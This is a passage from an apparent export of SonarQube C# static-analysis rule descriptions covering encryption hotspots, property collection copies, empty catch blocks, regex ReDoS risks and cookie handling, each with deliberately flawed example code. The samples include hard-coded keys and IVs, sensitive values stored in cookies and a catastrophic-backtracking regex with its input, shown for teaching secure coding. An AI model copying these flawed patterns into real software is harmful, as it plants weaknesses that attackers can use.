  <li> the private key might not be random, strong enough or the same key is reused for a long long time. </li>
  <li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li>
  <li> the key exchange is made without properly authenticating the receiver. </li>
  <li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time
  passes. </li>
  <li> the chosen encryption library is deemed unsafe. </li>
  <li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li>
  <li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.
  </li>
  <li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it's IV (Initialization Vector) is not generated using a secure random
  algorithm, or it is reused. </li>
  <li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.
  </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Generate encryption keys using secure random algorithms. </li>
  <li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force
  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.
  </li>
  <li> Regenerate the keys regularly. </li>
  <li> Always store the keys in a safe location and transfer them only over safe channels. </li>
  <li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li>
  <li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are
  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms are they will have most
  probably flaws. </li>
  <li> When a nonce is used, generate it randomly every time. </li>
  <li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li>
  <li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks
  like ""Chosen-Plaintext Attacks"". Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption
  cycle, because the IV's purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li>
  <li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be
  preferred to the following combinations which are not secured:
    <ul>
      <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it
      does not hide data patterns well. In some senses, it doesn't provide serious message confidentiality, and it is not recommended for use in
      cryptographic protocols at all. </li>
      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>
    </ul> </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
using System;
using System.Security.Cryptography;

namespace MyNamespace
{
    public class MyClass
    {
        public void Main()
        {
            Byte[] data = {1,1,1};

            RSA myRSA = RSA.Create();
            RSAEncryptionPadding padding = RSAEncryptionPadding.CreateOaep(HashAlgorithmName.SHA1);
            // Review all base RSA class' Encrypt/Decrypt calls
            myRSA.Encrypt(data, padding); // Questionable
            myRSA.EncryptValue(data); // Questionable
            myRSA.Decrypt(data, padding); // Questionable
            myRSA.DecryptValue(data); // Questionable

            RSACryptoServiceProvider myRSAC = new RSACryptoServiceProvider();
            // Review the use of any TryEncrypt/TryDecrypt and specific Encrypt/Decrypt of RSA subclasses.
            myRSAC.Encrypt(data, false); // Questionable
            myRSAC.Decrypt(data, false); // Questionable
            int written;
            myRSAC.TryEncrypt(data, Span&lt;byte&gt;.Empty, padding, out written); // Questionable
            myRSAC.TryDecrypt(data, Span&lt;byte&gt;.Empty, padding, out written); // Questionable

            byte[] rgbKey = {1,2,3};
            byte[] rgbIV = {4,5,6};
            SymmetricAlgorithm rijn = SymmetricAlgorithm.Create();
            // Review the creation of Encryptors from any SymmetricAlgorithm instance.
            rijn.CreateEncryptor(); // Questionable
            rijn.CreateEncryptor(rgbKey, rgbIV); // Questionable
            rijn.CreateDecryptor(); // Questionable
            rijn.CreateDecryptor(rgbKey, rgbIV); // Questionable
        }

        public class MyCrypto : System.Security.Cryptography.AsymmetricAlgorithm // Questionable
        {
            // ...
        }

        public class MyCrypto2 : System.Security.Cryptography.SymmetricAlgorithm // Questionable
        {
            // ...
        }
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/321.html"">MITRE, CWE-321</a> - Use of Hard-coded Cryptographic Key </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/322.html"">MITRE, CWE-322</a> - Key Exchange without Entity Authentication </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/323.html"">MITRE, CWE-323</a> - Reusing a Nonce, Key Pair in Encryption </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/324.html"">MITRE, CWE-324</a> - Use of a Key Past its Expiration Date </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/325.html"">MITRE, CWE-325</a> - Missing Required Cryptographic Step </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/327.html"">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/522.html"">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li>
  <li> [OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> [OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",csharpsquid:S4787,cs,C#,"<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7902"">CVE-2017-7902</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1378"">CVE-2006-1378</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1376"">CVE-2003-1376</a> </li>
</ul>
<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed
regularly. However these are not the only means to defeat or weaken an encryption.</p>
<p> </p>
<p>This rule flags function calls that initiate encryption/decryption. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the private key might not be random, strong enough or the same key is reused for a long long time. </li>
  <li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li>
  <li> the key exchange is made without properly authenticating the receiver. </li>
  <li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time
  passes. </li>
  <li> the chosen encryption library is deemed unsafe. </li>
  <li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li>
  <li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.
  </li>
  <li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it's IV (Initialization Vector) is not generated using a secure random
  algorithm, or it is reused. </li>
  <li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.
  </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Generate encryption keys using secure random algorithms. </li>
  <li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force
  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.
  </li>
  <li> Regenerate the keys regularly. </li>
  <li> Always store the keys in a safe location and transfer them only over safe channels. </li>
  <li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li>
  <li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are
  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms are they will have most
  probably flaws. </li>
  <li> When a nonce is used, generate it randomly every time. </li>
  <li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li>
  <li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks
  like ""Chosen-Plaintext Attacks"". Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption
  cycle, because the IV's purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li>
  <li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be
  preferred to the following combinations which are not secured:
    <ul>
      <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it
      does not hide data patterns well. In some senses, it doesn't provide serious message confidentiality, and it is not recommended for use in
      cryptographic protocols at all. </li>
      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>
    </ul> </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
using System;
using System.Security.Cryptography;

namespace MyNamespace
{
    public class MyClass
    {
        public void Main()
        {
            Byte[] data = {1,1,1};

            RSA myRSA = RSA.Create();
            RSAEncryptionPadding padding = RSAEncryptionPadding.CreateOaep(HashAlgorithmName.SHA1);
            // Review all base RSA class' Encrypt/Decrypt calls
            myRSA.Encrypt(data, padding); // Questionable
            myRSA.EncryptValue(data); // Questionable
            myRSA.Decrypt(data, padding); // Questionable
            myRSA.DecryptValue(data); // Questionable

            RSACryptoServiceProvider myRSAC = new RSACryptoServiceProvider();
            // Review the use of any TryEncrypt/TryDecrypt and specific Encrypt/Decrypt of RSA subclasses.
            myRSAC.Encrypt(data, false); // Questionable
            myRSAC.Decrypt(data, false); // Questionable
            int written;
            myRSAC.TryEncrypt(data, Span&lt;byte&gt;.Empty, padding, out written); // Questionable
            myRSAC.TryDecrypt(data, Span&lt;byte&gt;.Empty, padding, out written); // Questionable

            byte[] rgbKey = {1,2,3};
            byte[] rgbIV = {4,5,6};
            SymmetricAlgorithm rijn = SymmetricAlgorithm.Create();
            // Review the creation of Encryptors from any SymmetricAlgorithm instance.
            rijn.CreateEncryptor(); // Questionable
            rijn.CreateEncryptor(rgbKey, rgbIV); // Questionable
            rijn.CreateDecryptor(); // Questionable
            rijn.CreateDecryptor(rgbKey, rgbIV); // Questionable
        }

        public class MyCrypto : System.Security.Cryptography.AsymmetricAlgorithm // Questionable
        {
            // ...
        }

        public class MyCrypto2 : System.Security.Cryptography.SymmetricAlgorithm // Questionable
        {
            // ...
        }
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/321.html"">MITRE, CWE-321</a> - Use of Hard-coded Cryptographic Key </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/322.html"">MITRE, CWE-322</a> - Key Exchange without Entity Authentication </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/323.html"">MITRE, CWE-323</a> - Reusing a Nonce, Key Pair in Encryption </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/324.html"">MITRE, CWE-324</a> - Use of a Key Past its Expiration Date </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/325.html"">MITRE, CWE-325</a> - Missing Required Cryptographic Step </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/327.html"">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/522.html"">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li>
  <li> [OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> [OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Encrypting data is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a3', 'owasp-a6', 'sans-top25-porous']",SECURITY_HOTSPOT
2017-05-05T12:32:51+0200,"<p>Most developers expect property access to be as efficient as field access. However, if a property returns a copy of an array or collection, it will
be much slower than simple field access, contrary to the caller's likely expectations. Therefore, such properties should be refactored into methods so
that callers are not surprised by the unexpectedly poor performance.</p>
<p>This rule detects calls to <code>ToList</code>, <code>ToArray</code> and array <code>Clone</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private List&lt;string&gt; _foo = new List&lt;string&gt; { ""a"", ""b"", ""c"" };
public IEnumerable&lt;string&gt; Foo  // Noncompliant
{
    get
    {
        return _foo.ToList();
    }
}

private string[] _bar = new string[] { ""a"", ""b"", ""c"" };
public IEnumerable&lt;string&gt; Bar // Noncompliant
{
    get
    {
        return (string[])_bar.Clone();
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private List&lt;string&gt; _foo = new List&lt;string&gt; { ""a"", ""b"", ""c"" };
private string[] _bar = new string[] { ""a"", ""b"", ""c"" };

public IEnumerable&lt;string&gt; GetFoo()
{
    return _foo.ToList();
}

public IEnumerable&lt;string&gt; GetBar()
{
    return (string[])_bar.Clone();
}
</pre>",csharpsquid:S2365,cs,C#,"<p>Most developers expect property access to be as efficient as field access. However, if a property returns a copy of an array or collection, it will
be much slower than simple field access, contrary to the caller's likely expectations. Therefore, such properties should be refactored into methods so
that callers are not surprised by the unexpectedly poor performance.</p>
<p>This rule detects calls to <code>ToList</code>, <code>ToArray</code> and array <code>Clone</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
private List&lt;string&gt; _foo = new List&lt;string&gt; { ""a"", ""b"", ""c"" };
public IEnumerable&lt;string&gt; Foo  // Noncompliant
{
    get
    {
        return _foo.ToList();
    }
}

private string[] _bar = new string[] { ""a"", ""b"", ""c"" };
public IEnumerable&lt;string&gt; Bar // Noncompliant
{
    get
    {
        return (string[])_bar.Clone();
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
private List&lt;string&gt; _foo = new List&lt;string&gt; { ""a"", ""b"", ""c"" };
private string[] _bar = new string[] { ""a"", ""b"", ""c"" };

public IEnumerable&lt;string&gt; GetFoo()
{
    return _foo.ToList();
}

public IEnumerable&lt;string&gt; GetBar()
{
    return (string[])_bar.Clone();
}
</pre>",Properties should not make collection or array copies,[],CRITICAL,"['api-design', 'performance']",CODE_SMELL
2015-05-20T05:01:17+0200,"<p>When exceptions occur, it is usually a bad idea to simply ignore them. Instead, it is better to handle them properly, or at least to log them.</p>
<p>This rule only reports on empty catch clauses that catch generic <code>Exception</code>s.</p>
<h2>Noncompliant Code Example</h2>
<pre>
string text = """";
try
{
    text = File.ReadAllText(fileName);
}
catch (Exception exc) // Noncompliant
{
}
</pre>
<h2>Compliant Solution</h2>
<pre>
string text = """";
try
{
    text = File.ReadAllText(fileName);
}
catch (Exception exc)
{
    logger.Log(exc);
}
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, it is not considered to be empty.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/391.html"">MITRE, CWE-391</a> - Unchecked Error Condition </li>
  <li> OWASP Top 10 2017 Category A10 - Insufficient Logging &amp; Monitoring </li>
</ul>",csharpsquid:S2486,cs,C#,"<p>When exceptions occur, it is usually a bad idea to simply ignore them. Instead, it is better to handle them properly, or at least to log them.</p>
<p>This rule only reports on empty catch clauses that catch generic <code>Exception</code>s.</p>
<h2>Noncompliant Code Example</h2>
<pre>
string text = """";
try
{
    text = File.ReadAllText(fileName);
}
catch (Exception exc) // Noncompliant
{
}
</pre>
<h2>Compliant Solution</h2>
<pre>
string text = """";
try
{
    text = File.ReadAllText(fileName);
}
catch (Exception exc)
{
    logger.Log(exc);
}
</pre>
<h2>Exceptions</h2>
<p>When a block contains a comment, it is not considered to be empty.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/391.html"">MITRE, CWE-391</a> - Unchecked Error Condition </li>
  <li> OWASP Top 10 2017 Category A10 - Insufficient Logging &amp; Monitoring </li>
</ul>",Generic exceptions should not be ignored,[],CRITICAL,"['cwe', 'error-handling', 'owasp-a10', 'suspicious']",VULNERABILITY
2018-11-29T11:10:36+0100,"<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021"">CVE-2017-16021</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863"">CVE-2018-13863</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8926"">CVE-2018-8926</a> </li>
</ul>
<p>Regular Expressions are subject to different kinds of vulnerabilities.</p>
<p> </p>
<p>First, evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions
such as <code>(a+)+</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code>. The problem is that
with every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a+</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating user-provided strings as regular expressions opens the door to <a
href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">Regular expression Denial of Service (ReDoS)</a> attacks. In the
context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making the
service inaccessible to genuine users.</p>
<p> </p>
<p>Another type of vulnerability can occur when regular expressions are used to validate user input. A regular expression can be used to filter unsafe
input by either matching a whole input when it is valid (example: the whole string should only contain alphanumeric characters) or by detecting
dangerous parts of an input. In both cases it is possible to let dangerous values through. For example, searching for <code>&lt;script&gt;</code> tags
in some HTML code with the regular expression <code>.*&lt;script&gt;.*</code> will miss <code>&lt;script id=""test""&gt;</code>.</p>
<p> </p>
<p>This rule flags any regular expression execution or compilation for review.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> a user input string is executed as a regular-expression, or it is inserted in a regular expression. </li>
  <li> a user can provide a string which will be analyzed by a regular expression. </li>
  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>
  <li> the regular expression is used to validate unsafe input, but it does not detect all dangerous values. </li>
</ul>
<p>You may be at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid executing a user input string as a regular expression. If this is required, restrict the allowed regular expressions.</p>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you're are using.</p>
<p>Test your regular expressions with techniques such as equivalence partitioning, and boundary value analysis, and test for robustness. Try not to
make complex regular expressions as they are difficult to understand and test. Note that some regular expression engines will match only part of the
input if no anchors are used. In PHP for example <code>preg_match(""/[A-Za-z0-9]+/"", $text)</code> will accept any string containing at least one
alphanumeric character because it has no anchors.</p>
<h2>Questionable Code Example</h2>
<pre>
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;
using System.Text.RegularExpressions;
using System.Web;

namespace N
{
    public class RegularExpression
    {
        void Foo(string pattern, RegexOptions options, TimeSpan matchTimeout, string input,
                 string replacement, MatchEvaluator evaluator)
        {
            // All the following instantiations are Questionable. Validate the regular expression and matched input.
            new System.Text.RegularExpressions.Regex(pattern);
            new System.Text.RegularExpressions.Regex(pattern, options);
            new System.Text.RegularExpressions.Regex(pattern, options, matchTimeout);

            // All the following static methods are Questionable.
            System.Text.RegularExpressions.Regex.IsMatch(input, pattern);
            System.Text.RegularExpressions.Regex.IsMatch(input, pattern, options);
            System.Text.RegularExpressions.Regex.IsMatch(input, pattern, options, matchTimeout);

            System.Text.RegularExpressions.Regex.Match(input, pattern);
            System.Text.RegularExpressions.Regex.Match(input, pattern, options);
            System.Text.RegularExpressions.Regex.Match(input, pattern, options, matchTimeout);

            System.Text.RegularExpressions.Regex.Matches(input, pattern);
            System.Text.RegularExpressions.Regex.Matches(input, pattern, options);
            System.Text.RegularExpressions.Regex.Matches(input, pattern, options, matchTimeout);

            System.Text.RegularExpressions.Regex.Replace(input, pattern, evaluator);
            System.Text.RegularExpressions.Regex.Replace(input, pattern, evaluator, options);
            System.Text.RegularExpressions.Regex.Replace(input, pattern, evaluator, options, matchTimeout);
            System.Text.RegularExpressions.Regex.Replace(input, pattern, replacement);
            System.Text.RegularExpressions.Regex.Replace(input, pattern, replacement, options);
            System.Text.RegularExpressions.Regex.Replace(input, pattern, replacement, options, matchTimeout);

            System.Text.RegularExpressions.Regex.Split(input, pattern);
            System.Text.RegularExpressions.Regex.Split(input, pattern, options);
            System.Text.RegularExpressions.Regex.Split(input, pattern, options, matchTimeout);
        }
    }
}
</pre>
<h2>Exceptions</h2>
<p>Regardless of the string being matched, a hardcoded regular expression pattern is not vulnerable to ReDoS attacks if it consists only of one
character or only alphanumeric characters. No issue will be raised for these cases.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">MITRA, CWE-624</a> - Executable Regular Expression Error
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/185.html"">MITRA, CWE-185</a> - Incorrect Regular Expression </li>
  <li> OWASP Regular expression Denial of Service - ReDoS </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",csharpsquid:S4784,cs,C#,"<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021"">CVE-2017-16021</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863"">CVE-2018-13863</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8926"">CVE-2018-8926</a> </li>
</ul>
<p>Regular Expressions are subject to different kinds of vulnerabilities.</p>
<p> </p>
<p>First, evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions
such as <code>(a+)+</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!</code>. The problem is that
with every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a+</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating user-provided strings as regular expressions opens the door to <a
href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">Regular expression Denial of Service (ReDoS)</a> attacks. In the
context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making the
service inaccessible to genuine users.</p>
<p> </p>
<p>Another type of vulnerability can occur when regular expressions are used to validate user input. A regular expression can be used to filter unsafe
input by either matching a whole input when it is valid (example: the whole string should only contain alphanumeric characters) or by detecting
dangerous parts of an input. In both cases it is possible to let dangerous values through. For example, searching for <code>&lt;script&gt;</code> tags
in some HTML code with the regular expression <code>.*&lt;script&gt;.*</code> will miss <code>&lt;script id=""test""&gt;</code>.</p>
<p> </p>
<p>This rule flags any regular expression execution or compilation for review.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> a user input string is executed as a regular-expression, or it is inserted in a regular expression. </li>
  <li> a user can provide a string which will be analyzed by a regular expression. </li>
  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>
  <li> the regular expression is used to validate unsafe input, but it does not detect all dangerous values. </li>
</ul>
<p>You may be at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Avoid executing a user input string as a regular expression. If this is required, restrict the allowed regular expressions.</p>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you're are using.</p>
<p>Test your regular expressions with techniques such as equivalence partitioning, and boundary value analysis, and test for robustness. Try not to
make complex regular expressions as they are difficult to understand and test. Note that some regular expression engines will match only part of the
input if no anchors are used. In PHP for example <code>preg_match(""/[A-Za-z0-9]+/"", $text)</code> will accept any string containing at least one
alphanumeric character because it has no anchors.</p>
<h2>Questionable Code Example</h2>
<pre>
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;
using System.Text.RegularExpressions;
using System.Web;

namespace N
{
    public class RegularExpression
    {
        void Foo(string pattern, RegexOptions options, TimeSpan matchTimeout, string input,
                 string replacement, MatchEvaluator evaluator)
        {
            // All the following instantiations are Questionable. Validate the regular expression and matched input.
            new System.Text.RegularExpressions.Regex(pattern);
            new System.Text.RegularExpressions.Regex(pattern, options);
            new System.Text.RegularExpressions.Regex(pattern, options, matchTimeout);

            // All the following static methods are Questionable.
            System.Text.RegularExpressions.Regex.IsMatch(input, pattern);
            System.Text.RegularExpressions.Regex.IsMatch(input, pattern, options);
            System.Text.RegularExpressions.Regex.IsMatch(input, pattern, options, matchTimeout);

            System.Text.RegularExpressions.Regex.Match(input, pattern);
            System.Text.RegularExpressions.Regex.Match(input, pattern, options);
            System.Text.RegularExpressions.Regex.Match(input, pattern, options, matchTimeout);

            System.Text.RegularExpressions.Regex.Matches(input, pattern);
            System.Text.RegularExpressions.Regex.Matches(input, pattern, options);
            System.Text.RegularExpressions.Regex.Matches(input, pattern, options, matchTimeout);

            System.Text.RegularExpressions.Regex.Replace(input, pattern, evaluator);
            System.Text.RegularExpressions.Regex.Replace(input, pattern, evaluator, options);
            System.Text.RegularExpressions.Regex.Replace(input, pattern, evaluator, options, matchTimeout);
            System.Text.RegularExpressions.Regex.Replace(input, pattern, replacement);
            System.Text.RegularExpressions.Regex.Replace(input, pattern, replacement, options);
            System.Text.RegularExpressions.Regex.Replace(input, pattern, replacement, options, matchTimeout);

            System.Text.RegularExpressions.Regex.Split(input, pattern);
            System.Text.RegularExpressions.Regex.Split(input, pattern, options);
            System.Text.RegularExpressions.Regex.Split(input, pattern, options, matchTimeout);
        }
    }
}
</pre>
<h2>Exceptions</h2>
<p>Regardless of the string being matched, a hardcoded regular expression pattern is not vulnerable to ReDoS attacks if it consists only of one
character or only alphanumeric characters. No issue will be raised for these cases.</p>
<h2>See</h2>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS"">MITRA, CWE-624</a> - Executable Regular Expression Error
  </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/185.html"">MITRA, CWE-185</a> - Incorrect Regular Expression </li>
  <li> OWASP Regular expression Denial of Service - ReDoS </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Using regular expressions is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'sans-top25-porous']",SECURITY_HOTSPOT
2018-05-16T12:56:55+0200,"<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7772"">CVE-2018-7772</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10085"">CVE-2018-10085</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6537"">CVE-2016-6537</a> </li>
</ul>
<p>Attackers can use widely-available tools to read and modify cookies, thus:</p>
<ul>
  <li> sensitive information written by the server will be exposed. </li>
  <li> cookies sent by the client can be crafted to attack server vulnerabilities. </li>
</ul>
<p>This rule flags code that reads or writes cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sensitive information is stored inside the cookie. </li>
  <li> cookie values are used without being first sanitized. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the
user session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer
than the user session.</p>
<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the
original information will be exposed.</p>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> every information read from a cookie before using them.</p>
<p>Using cookies only for session IDs doesn't make them secure. Follow <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">OWASP best practices</a> when you configure your cookies.</p>
<h2>Questionable Code Example</h2>
<pre>
// === .Net Framework ===

HttpCookie myCookie = new HttpCookie(""UserSettings"");
myCookie[""CreditCardNumber""] = ""1234 1234 1234 1234""; // Questionable; sensitive data stored
myCookie.Values[""password""] = ""5678""; // Questionable
myCookie.Value = ""mysecret""; // Questionable
...
Response.Cookies.Add(myCookie);

if (Request.Cookies[""myCookie""] != null &amp;&amp; Request.Cookies[""myCookie""][""myValue""] != null) // Questionable; reading a cookie's value
{
    string value = Request.Cookies[""myCookie""][""myValue""]; // Questionable
    value = Request.Cookies[""myCookie""].Values[""myValue""]; // Questionable
}

string value2 = Request.Cookies[""myCookie2""].Value; // Questionable


// === .Net Core ===

Response.Headers.Add(""Set-Cookie"", ...); // Questionable
Response.Cookies.Append(""mykey"", ""myValue""); // Questionable

Request.Cookies; // Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/312.html"">MITRE, CWE-312</a> - Cleartext Storage of Sensitive Information </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/315.html"">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/565.html"">MITRE CWE-565</a> - Reliance on Cookies without Validation and Integrity Checking
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
